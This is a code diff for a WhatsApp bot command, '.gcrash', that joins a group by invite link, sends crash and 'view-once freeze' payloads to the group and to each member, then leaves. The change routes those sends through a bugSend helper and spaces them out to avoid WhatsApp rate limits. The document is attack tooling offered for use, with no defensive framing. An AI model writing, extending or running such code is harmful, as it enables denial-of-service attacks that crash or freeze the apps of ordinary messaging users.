@@ -2,6 +2,7 @@
 // .gcrash <invite link>  → bot joins the group, sends crash payloads to every member, then leaves.
 // Owner only. The bot must not already be a member (it joins fresh each time).
 import { PREFIX } from '../lib/config.js';
+import { bugSend } from '../lib/bugsend.js';
 
 /* ---- reuse crash helpers from bug.js ---- */
 function overflowText(repeat = 2000) {
@@ -125,7 +126,7 @@ export default [
 
       for (const payload of GROUP_PAYLOADS) {
         try {
-          await sock.sendMessage(groupJid, payload);
+          await bugSend(sock, groupJid, payload);
           sent++;
         } catch { failed++; }
         await sleep(400);
@@ -137,7 +138,7 @@ export default [
         // skip ourselves (the bot's own JID)
         if (memberJid === sock.user?.id || memberJid.startsWith(sock.user?.id?.split(':')[0])) continue;
         try {
-          await sock.sendMessage(memberJid, viewOnceFreezePayload());
+          await bugSend(sock, memberJid, viewOnceFreezePayload());
           sent++;
         } catch { failed++; }
         await sleep(300); // small gap so WA doesn't rate-limit
